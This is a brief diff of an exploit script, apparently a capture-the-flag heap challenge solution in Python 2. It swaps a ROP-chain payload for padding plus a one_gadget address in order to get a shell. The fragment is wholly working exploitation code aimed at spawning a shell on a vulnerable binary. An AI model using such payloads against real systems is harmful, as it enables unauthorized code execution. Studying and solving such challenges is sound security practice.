@@ -123,7 +123,7 @@ rop=p64(pop_rax_ret)+p64(system)
 #fake heap
 # add(1,900,rop+"Q"*(96-len(rop)+48)+p64(known_heap)+p64(heapbase+0x220+32)+p64(0)+p64(0x91))
 
-add(1,900,rop+"Q"*(96-len(rop)+48)+p64(one_gadget))
+add(1,900,"Q"*(96+48)+p64(one_gadget))
 
 print "[+] Get Shell "
 r.sendline("3")
